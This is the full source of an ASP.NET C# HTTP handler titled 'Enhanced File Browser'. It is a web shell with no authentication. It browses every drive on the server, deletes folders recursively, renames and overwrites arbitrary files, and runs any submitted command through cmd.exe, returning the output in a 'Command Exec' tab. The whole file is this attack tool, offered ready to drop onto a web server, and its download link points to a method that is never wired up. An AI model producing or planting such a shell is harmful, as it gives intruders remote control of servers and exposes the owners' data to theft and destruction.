<%@ WebHandler Language="C#" Class="EnhancedFileBrowser" %>
using System;
using System.Web;
using System.IO;
using System.Text;
using System.Diagnostics;

public class EnhancedFileBrowser : IHttpHandler
{
    private const string DefaultFolder = @"C:\"; // Change as per your server environment

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/html; charset=utf-8";

        string action = context.Request["action"];
        string requestedPath = context.Request["path"];

        string currentPath = ValidatePathOrDefault(requestedPath);

        StringBuilder html = new StringBuilder();
        html.Append("<html><head><title>Enhanced File Browser</title>");
        html.Append(@"<style>
            body{font-family:Segoe UI,sans-serif;}
            nav { margin-bottom: 20px; }
            nav a { margin-right: 15px; text-decoration:none; font-weight:bold; cursor:pointer;}
            table { border-collapse: collapse; width: 100%; }
            th, td {border: 1px solid #ccc; padding: 8px; text-align:left;}
            tr:hover {background-color: #f0f0f0;}
            .error{color:red;} .success{color:green;}
            .tab {display:none;} .tab.active{display:block;}
            .button {padding:5px 10px; margin:2px; cursor:pointer;}
            ul.dir-list {list-style:none; padding-left:0; margin:0 0 1em 0;}
            ul.dir-list li {margin:3px 0;}
            a.back-link {
                font-weight:bold;
                display:inline-block;
                margin-bottom:10px;
                text-decoration:none;
            }
            a.back-link:hover {
                text-decoration: underline;
            }
            </style>");
        html.Append(@"<script>
            function showTab(id) {
                var tabs = document.getElementsByClassName('tab');
                for(var i=0; i<tabs.length; i++) {
                    tabs[i].classList.remove('active');
                }
                document.getElementById(id).classList.add('active');
            }
            function confirmDelete(path) {
                if(confirm('Are you sure to delete ' + path + '?')) {
                    window.location.href = '?action=delete&path=' + encodeURIComponent(path);
                }
            }
            function renameFile(path) {
                var newName = prompt('Enter new name:', '');
                if(newName) {
                    var url = '?action=rename&path=' + encodeURIComponent(path) + '&newname=' + encodeURIComponent(newName);
                    window.location.href = url;
                }
            }
            function editFile(path) {
                var url = '?action=editform&path=' + encodeURIComponent(path);
                window.location.href = url;
            }
            function toggleDrives() {
                var d = document.getElementById('drivesList');
                if(d.style.display === 'none' || d.style.display === '') d.style.display = 'block';
                else d.style.display = 'none';
            }
            // ajax submit for command exec
            function executeCommand(event) {
                event.preventDefault();
                var form = event.target;
                var xhr = new XMLHttpRequest();
                var formData = new FormData(form);
                xhr.open('POST', form.action, true);
                xhr.onload = function() {
                    if(xhr.status === 200) {
                        document.getElementById('cmdOutput').innerHTML = '<pre style=\"background:#eee;padding:10px;\">' + xhr.responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</pre>';
                    }
                };
                xhr.send(formData);
            }
            </script>");
        html.Append("</head><body>");

        // Drives list toggle button and container
        html.Append(@"<button onclick='toggleDrives()' style='margin-bottom:10px;padding:5px 10px;'>Toggle Drives List</button>");
        html.Append(@"<div id='drivesList' style='display:none;border:1px solid #ccc;padding:10px;margin-bottom:15px;background:#f9f9f9;'>");

        try
        {
            string[] drives = Environment.GetLogicalDrives();
            foreach(string drive in drives)
            {
                string encodedDrive = HttpUtility.UrlEncode(drive);
                html.Append($"<a href='?path={encodedDrive}' style='margin-right:15px;font-weight:bold;'>{drive}</a>");
            }
        }
        catch(Exception)
        {
            // swallow
        }
        html.Append("</div>");

        html.Append("<nav>");
        html.Append("<a onclick=\"showTab('browseTab')\">Browse Files</a> | ");
        html.Append("<a onclick=\"showTab('cmdTab')\">Command Exec</a>");
        html.Append("</nav>");

        string message = PerformActions(context, action, currentPath, out currentPath);
        if (!string.IsNullOrEmpty(message))
        {
            html.Append($"<p>{message}</p>");
        }

        html.Append("<div id='browseTab' class='tab active'>");
        html.Append(RenderFileBrowser(context, currentPath));
        html.Append("</div>");

        html.Append("<div id='cmdTab' class='tab'>");
        html.Append(RenderCommandExec(context));
        html.Append("</div>");

        html.Append("</body></html>");
        context.Response.Write(html.ToString());
    }

    private string ValidatePathOrDefault(string path)
    {
        if (string.IsNullOrWhiteSpace(path))
            return DefaultFolder;
        try
        {
            if (Directory.Exists(path)) return path;
            if (File.Exists(path)) return Path.GetDirectoryName(path);
        }
        catch { }
        return DefaultFolder;
    }

    private string PerformActions(HttpContext context, string action, string currentPath, out string updatedPath)
    {
        updatedPath = currentPath;
        if (string.IsNullOrWhiteSpace(action)) return null;

        try
        {
            switch (action.ToLower())
            {
                case "delete":
                    {
                        string target = context.Request["path"];
                        if (string.IsNullOrWhiteSpace(target))
                            return "<span class='error'>Delete failed: Path missing.</span>";
                        if (File.Exists(target))
                        {
                            File.Delete(target);
                            return $"<span class='success'>File '{HttpUtility.HtmlEncode(target)}' deleted.</span>";
                        }
                        else if (Directory.Exists(target))
                        {
                            Directory.Delete(target, true);
                            return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(target)}' deleted.</span>";
                        }
                        else
                        {
                            return $"<span class='error'>Path not found: '{HttpUtility.HtmlEncode(target)}'</span>";
                        }
                    }
                case "rename":
                    {
                        string target = context.Request["path"];
                        string newName = context.Request["newname"];
                        if (string.IsNullOrWhiteSpace(target))
                            return "<span class='error'>Rename failed: Path missing.</span>";
                        if (string.IsNullOrWhiteSpace(newName))
                            return "<span class='error'>Rename failed: New name missing.</span>";
                        string newFullPath = Path.Combine(Path.GetDirectoryName(target), newName);
                        if (File.Exists(target))
                        {
                            File.Move(target, newFullPath);
                            updatedPath = Path.GetDirectoryName(newFullPath);
                            return $"<span class='success'>File renamed to '{HttpUtility.HtmlEncode(newName)}'.</span>";
                        }
                        else if (Directory.Exists(target))
                        {
                            Directory.Move(target, newFullPath);
                            updatedPath = Path.GetDirectoryName(newFullPath);
                            return $"<span class='success'>Folder renamed to '{HttpUtility.HtmlEncode(newName)}'.</span>";
                        }
                        else
                        {
                            return $"<span class='error'>Original path not found.</span>";
                        }
                    }
                case "editform":
                    return null;
                case "saveedit":
                    {
                        string filePath = context.Request["path"];
                        if (string.IsNullOrWhiteSpace(filePath))
                            return "<span class='error'>Save failed: Path missing.</span>";
                        if (File.Exists(filePath))
                        {
                            string content = context.Request.Form["filecontent"];
                            File.WriteAllText(filePath, content);
                            updatedPath = Path.GetDirectoryName(filePath);
                            return $"<span class='success'>File '{HttpUtility.HtmlEncode(filePath)}' saved successfully.</span>";
                        }
                        else
                        {
                            return $"<span class='error'>File not found for saving.</span>";
                        }
                    }
                case "newfolder":
                    {
                        string folderName = context.Request["foldername"];
                        if (string.IsNullOrWhiteSpace(folderName))
                            return "<span class='error'>Folder creation failed: Folder name missing.</span>";
                        string newDir = Path.Combine(currentPath, folderName);
                        if (!Directory.Exists(newDir))
                        {
                            Directory.CreateDirectory(newDir);
                            return $"<span class='success'>Folder '{HttpUtility.HtmlEncode(folderName)}' created.</span>";
                        }
                        else
                        {
                            return $"<span class='error'>Folder already exists.</span>";
                        }
                    }
            }
        }
        catch (Exception ex)
        {
            return $"<span class='error'>Error: {HttpUtility.HtmlEncode(ex.Message)}</span>";
        }
        return null;
    }

    private string RenderFileBrowser(HttpContext context, string path)
    {
        StringBuilder sb = new StringBuilder();
        sb.Append($"<h2>Browsing: {HttpUtility.HtmlEncode(path)}</h2>");
        sb.Append(@"<form method='get'>
            <input type='hidden' name='action' value='newfolder'/>
            <input type='hidden' name='path' value='" + HttpUtility.HtmlEncode(path) + @"'/>
            New Folder Name: <input type='text' name='foldername' required />
            <input type='submit' value='Create'/>
            </form><hr/>");

        var parent = Directory.GetParent(path);
        if (parent != null)
        {
            sb.Append($"<a href='?path={HttpUtility.UrlEncode(parent.FullName)}' class='back-link'>&larr; Back to {HttpUtility.HtmlEncode(parent.FullName)}</a><br/><br/>");
        }

        string[] allDirs;
        try { allDirs = Directory.GetDirectories(path); } catch { allDirs = new string[0]; }
        if (allDirs.Length > 0)
        {
            sb.Append("<b>Directories:</b><ul class='dir-list'>");
            foreach (var d in allDirs)
            {
                var di = new DirectoryInfo(d);
                sb.Append($"<li><a href='?path={HttpUtility.UrlEncode(d)}'>{HttpUtility.HtmlEncode(di.Name)}</a></li>");
            }
            sb.Append("</ul><hr/>");
        }

        sb.Append("<table><thead><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Actions</th></tr></thead><tbody>");
        try
        {
            foreach (var d in allDirs)
            {
                var di = new DirectoryInfo(d);
                sb.Append("<tr>");
                sb.Append($"<td><b><a href='?path={HttpUtility.UrlEncode(d)}'>{HttpUtility.HtmlEncode(di.Name)}</a></b></td>");
                sb.Append("<td>--</td>");
                sb.Append($"<td>{di.LastWriteTime}</td>");
                sb.Append("<td>");
                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(d)}')\">Rename</button>");
                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(d)}')\">Delete</button>");
                sb.Append("</td>");
                sb.Append("</tr>");
            }

            foreach (var f in Directory.GetFiles(path))
            {
                var fi = new FileInfo(f);
                sb.Append("<tr>");
                sb.Append($"<td><a href='?action=editform&path={HttpUtility.UrlEncode(f)}'>{HttpUtility.HtmlEncode(fi.Name)}</a></td>");
                sb.Append($"<td>{FormatSize(fi.Length)}</td>");
                sb.Append($"<td>{fi.LastWriteTime}</td>");
                sb.Append("<td>");
                sb.Append($"<a class='button' href='?action=download&path={HttpUtility.UrlEncode(f)}'>Download</a>");
                sb.Append($"<button class='button' onclick=\"renameFile('{HttpUtility.JavaScriptStringEncode(f)}')\">Rename</button>");
                sb.Append($"<button class='button' onclick=\"confirmDelete('{HttpUtility.JavaScriptStringEncode(f)}')\">Delete</button>");
                sb.Append($"<button class='button' onclick=\"editFile('{HttpUtility.JavaScriptStringEncode(f)}')\">Edit</button>");
                sb.Append("</td>");
                sb.Append("</tr>");
            }
        }
        catch (Exception ex)
        {
            sb.Append($"<tr><td colspan='4' class='error'>Error reading directory: {HttpUtility.HtmlEncode(ex.Message)}</td></tr>");
        }
        sb.Append("</tbody></table>");

        if (context.Request["action"] == "editform")
        {
            string editPath = context.Request["path"];
            if (!string.IsNullOrWhiteSpace(editPath) && File.Exists(editPath))
            {
                string content = File.ReadAllText(editPath);
                sb.Append("<hr/><h3>Editing File: " + HttpUtility.HtmlEncode(editPath) + "</h3>");
                sb.Append("<form method='post'>");
                sb.Append($"<input type='hidden' name='action' value='saveedit'/>");
                sb.Append($"<input type='hidden' name='path' value='{HttpUtility.HtmlEncode(editPath)}'/>");
                sb.Append("<textarea name='filecontent' rows='20' cols='100' style='width:100%;font-family:monospace;'>");
                sb.Append(HttpUtility.HtmlEncode(content));
                sb.Append("</textarea><br/>");
                sb.Append("<input type='submit' value='Save File'/>");
                sb.Append("</form>");
            }
            else if (!string.IsNullOrWhiteSpace(editPath))
            {
                sb.Append("<p class='error'>File not found for editing.</p>");
            }
        }

        return sb.ToString();
    }

    private string RenderCommandExec(HttpContext context)
    {
        StringBuilder sb = new StringBuilder();
        sb.Append("<h2>Command Execution</h2>");
        sb.Append($@"<form method='post' action='EnhancedFileBrowser.ashx' onsubmit='executeCommand(event)'>
            <input type='hidden' name='action' value='cmdexec'/>
            <textarea name='cmdtext' rows='10' cols='80' style='width:100%;font-family:monospace;' placeholder='Enter command here'></textarea><br/>
            <input type='submit' value='Run Command'/>
            </form><hr/>");

        sb.Append("<div id='cmdOutput'>");

        if (context.Request.HttpMethod == "POST" && context.Request["action"] == "cmdexec")
        {
            string cmd = context.Request.Form["cmdtext"];
            if (!string.IsNullOrEmpty(cmd))
            {
                string output = ExecuteCmd(cmd);
                sb.Append("<pre style='background:#eee;padding:10px;'>");
                sb.Append(HttpUtility.HtmlEncode(output));
                sb.Append("</pre>");
            }
        }
        sb.Append("</div>");

        return sb.ToString();
    }

    private string ExecuteCmd(string command)
    {
        try
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (var process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                return output + (string.IsNullOrEmpty(error) ? "" : "\nERROR:\n" + error);
            }
        }
        catch (Exception ex)
        {
            return "Command execution failed: " + ex.Message;
        }
    }

    private string FormatSize(long bytes)
    {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024.0).ToString("0.0") + " KB";
        if (bytes < 1024 * 1024 * 1024) return (bytes / (1024.0 * 1024)).ToString("0.0") + " MB";
        return (bytes / (1024.0 * 1024 * 1024)).ToString("0.0") + " GB";
    }

    private string DownloadFile(HttpContext context, string file)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(file) || !File.Exists(file))
                return "<p class='error'>Download failed: File not found.</p>";

            var fi = new FileInfo(file);
            context.Response.Clear();
            context.Response.ContentType = "application/octet-stream";
            context.Response.AddHeader("Content-Disposition", "attachment; filename=" + fi.Name);
            context.Response.AddHeader("Content-Length", fi.Length.ToString());
            context.Response.TransmitFile(file);
            context.Response.Flush();
            context.Response.End();
            return null;
        }
        catch (Exception ex)
        {
            return "<p class='error'>Download failed: " + HttpUtility.HtmlEncode(ex.Message) + "</p>";
        }
    }

    public bool IsReusable { get { return false; } }
}
